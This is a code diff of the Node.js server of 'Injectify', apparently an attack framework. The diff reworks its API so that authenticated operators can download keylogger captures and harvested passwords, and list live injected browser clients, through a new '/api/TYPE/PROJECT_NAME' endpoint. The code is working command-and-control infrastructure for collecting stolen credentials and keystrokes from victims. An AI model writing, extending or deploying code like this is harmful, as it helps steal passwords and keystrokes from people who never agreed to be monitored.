@@ -56,7 +56,7 @@ const apiLimiter = new RateLimit({
   windowMs: 2*60*1000,
   max: 100,
   delayAfter: 10,
-  delayMs: 500,
+  delayMs: 300,
   message: JSON.stringify({
     success: false,
     reason: 'Too many requests, please try again later'
@@ -1649,140 +1649,6 @@ MongoClient.connect(config.mongodb, (err, client) => {
     })
   })
 
-  app.get('/api/json/*', apiLimiter, (req, res) => {
-    var getAPI = (name, token) => {
-      return new Promise((resolve, reject) => {
-        request({
-          url: 'https://api.github.com/user?access_token=' + encodeURIComponent(token),
-          method: 'GET',
-          headers: {
-            'Accept': 'application/json',
-            'User-Agent': 'Injectify'
-          }
-        }, (error, response, user) => {
-          try {
-            user = JSON.parse(user)
-          } catch (e) {
-            console.error(e)
-            reject({
-              title: 'Could not authenticate you',
-              message: 'Failed to parse the GitHub user API response'
-            })
-          }
-          if (!error && response.statusCode === 200 && user.login) {
-            db.collection('projects', (err, projects) => {
-              if (err) throw err
-              if (config.superusers.includes(user.id)) {
-                projects.findOne({
-                  'name': name
-                }).then(doc => {
-                  if (doc !== null) {
-                    resolve({
-                      json: doc,
-                      user: user
-                    })
-                  } else {
-                    reject({
-                      title: 'Access denied',
-                      message: 'Project ' + name + " doesn't exist!"
-                    })
-                  }
-                })
-              } else {
-                projects.findOne({
-                  $or: [
-                    {'permissions.owners': user.id},
-                    {'permissions.admins': user.id},
-                    {'permissions.readonly': user.id}
-                  ],
-                  $and: [
-                    {'name': name}
-                  ]
-                }).then(doc => {
-                  if (doc !== null) {
-                    resolve({
-                      json: doc,
-                      user: user
-                    })
-                  } else {
-                    reject({
-                      title: 'Access denied',
-                      message: "You don't have permission to access project " + name
-                    })
-                  }
-                })
-              }
-            })
-          } else {
-            reject({
-              title: 'Could not authenticate you',
-              message: 'GitHub API rejected token!'
-            })
-          }
-        })
-      })
-    }
-
-    let token = req.query.token
-    let project = decodeURIComponent(req.path.substring(10))
-
-    if (project && token) {
-      getAPI(project, token).then(data => {
-        let json = data.json
-        let user = data.user
-        res.setHeader('Content-Disposition', 'filename="Injectify project records [' + json.name + '].json"')
-        if (typeof req.query.download === 'string') {
-          res.setHeader('Content-Type', 'application/octet-stream')
-        } else {
-          res.setHeader('Content-Type', 'application/json')
-        }
-        if (json.passwords && json.keylogger) {
-          json = {
-            passwords: json.passwords,
-            keylogger: json.keylogger
-          }
-          let stringified = JSON.stringify(json, null, '    ')
-          if (json.passwords.length == 0 && json.keylogger.length == 0) {
-            res.status(206).send(stringified)
-          } else {
-            res.send(stringified)
-          }
-          console.log(
-            chalk.greenBright('[API/JSON] ') +
-            chalk.yellowBright('delivered ') +
-            chalk.magentaBright(project) +
-            chalk.redBright(' (length=' + stringified.length + ') ') +
-            chalk.yellowBright('to ') +
-            chalk.magentaBright(user.login) +
-            chalk.redBright(' (' + user.id + ') ')
-          )
-        } else {
-          res.status(500).send(JSON.stringify({
-            title: 'Database error',
-            message: 'An internal error occured whilst handling your request'
-          }, null, '    '))
-        }
-      }).catch(error => {
-        res.setHeader('Content-Type', 'application/json')
-        res.status(403).send(JSON.stringify(error, null, '    '))
-      })
-    } else if (token) {
-      res.setHeader('Content-Type', 'application/json')
-      res.status(400).send(JSON.stringify({
-        title: 'Bad request',
-        message: 'Specify a project name to return in request',
-        format: 'https://injectify.samdd.me/api/json/PROJECT_NAME?token=' + token
-      }, null, '    '))
-    } else {
-      res.setHeader('Content-Type', 'application/json')
-      res.status(400).send(JSON.stringify({
-        title: 'Bad request',
-        message: 'Specify a token & project name to return in request',
-        format: 'https://injectify.samdd.me/api/json/PROJECT_NAME?token=GITHUB_TOKEN'
-      }, null, '    '))
-    }
-  })
-
   app.get('/api/spoof/*', apiLimiter, (req, res) => {
     var getAPI = (name, index, token) => {
       return new Promise((resolve, reject) => {
@@ -2236,6 +2102,162 @@ MongoClient.connect(config.mongodb, (err, client) => {
       chalk.yellowBright('generated for project ') +
       chalk.magentaBright(req.query.project)
     )
+    }
+  })
+
+  app.get('/api/*', apiLimiter, (req, res) => {
+    var getAPI = (name, token, type) => {
+      return new Promise((resolve, reject) => {
+        request({
+          url: 'https://api.github.com/user?access_token=' + encodeURIComponent(token),
+          method: 'GET',
+          headers: {
+            'Accept': 'application/json',
+            'User-Agent': 'Injectify'
+          }
+        }, (error, response, user) => {
+          try {
+            user = JSON.parse(user)
+          } catch (e) {
+            console.error(e)
+            reject({
+              title: 'Could not authenticate you',
+              message: 'Failed to parse the GitHub user API response'
+            })
+          }
+          if (!error && response.statusCode === 200 && user.login) {
+            db.collection('projects', (err, projects) => {
+              if (err) throw err
+              if (config.superusers.includes(user.id)) {
+                projects.findOne({
+                  'name': name
+                }).then(doc => {
+                  if (doc !== null) {
+                    resolve({
+                      json: doc,
+                      user: user
+                    })
+                  } else {
+                    reject({
+                      title: 'Access denied',
+                      message: 'Project ' + name + " doesn't exist!"
+                    })
+                  }
+                })
+              } else {
+                projects.findOne({
+                  $or: [
+                    {'permissions.owners': user.id},
+                    {'permissions.admins': user.id},
+                    {'permissions.readonly': user.id}
+                  ],
+                  $and: [
+                    {'name': name}
+                  ]
+                }).then(doc => {
+                  if (doc !== null) {
+                    resolve({
+                      json: doc,
+                      user: user
+                    })
+                  } else {
+                    reject({
+                      title: 'Access denied',
+                      message: "You don't have permission to access project " + name
+                    })
+                  }
+                })
+              }
+            })
+          } else {
+            reject({
+              title: 'Could not authenticate you',
+              message: 'GitHub API rejected token!'
+            })
+          }
+        })
+      })
+    }
+
+    let token = req.query.token
+    let project = decodeURIComponent(req.path.split("/")[3])
+    let type = req.path.split("/")[2]
+
+    if (project && token && (type === 'keylogger' || type === 'passwords' || type === 'inject')) {
+      getAPI(project, token, type).then(data => {
+        let json = data.json
+        let user = data.user
+        let stringified
+
+        res.setHeader('Content-Disposition', 'filename="Injectify_API_' + json.name + '.json"')
+        if (typeof req.query.download === 'string') {
+          res.setHeader('Content-Type', 'application/octet-stream')
+        } else {
+          res.setHeader('Content-Type', 'application/json')
+        }
+
+        if (type === 'inject') {
+          if (inject.clients[json._id]) {
+            stringified = JSON.stringify({
+              inject: json.inject,
+              clients: inject.clients[json._id]
+            }, null, '    ')
+            res.send(stringified)
+          } else {
+            stringified = JSON.stringify([], null, '    ')
+            res.status(206).send(stringified)
+          }
+        } else if (json.passwords && json.keylogger) {
+          if (type == 'keylogger') {
+            json = {
+              keylogger: json.keylogger
+            }
+          } else {
+            json = {
+              passwords: json.passwords
+            }
+          }
+          stringified = JSON.stringify(json, null, '    ')
+          if (json[type].length == 0) {
+            res.status(206).send(stringified)
+          } else {
+            res.send(stringified)
+          }
+        } else {
+          res.status(500).send(JSON.stringify({
+            title: 'Database error',
+            message: 'An internal error occured whilst handling your request'
+          }, null, '    '))
+          return
+        }
+
+        console.log(
+          chalk.greenBright('[API/JSON] ') +
+          chalk.yellowBright('delivered ') +
+          chalk.magentaBright(project) +
+          chalk.redBright(' (length=' + stringified.length + ') ') +
+          chalk.yellowBright('to ') +
+          chalk.magentaBright(user.login) +
+          chalk.redBright(' (' + user.id + ') ')
+        )
+      }).catch(error => {
+        res.setHeader('Content-Type', 'application/json')
+        res.status(403).send(JSON.stringify(error, null, '    '))
+      })
+    } else if (token) {
+      res.setHeader('Content-Type', 'application/json')
+      res.status(400).send(JSON.stringify({
+        title: 'Bad request',
+        message: 'Specify the project name to return in request',
+        format: '/api/TYPE/PROJECT_NAME?token=' + token
+      }, null, '    '))
+    } else {
+      res.setHeader('Content-Type', 'application/json')
+      res.status(400).send(JSON.stringify({
+        title: 'Bad request',
+        message: 'Specify the type, project name & token to return in request',
+        format: '/api/TYPE/PROJECT_NAME?token=GITHUB_TOKEN'
+      }, null, '    '))
     }
   })
 
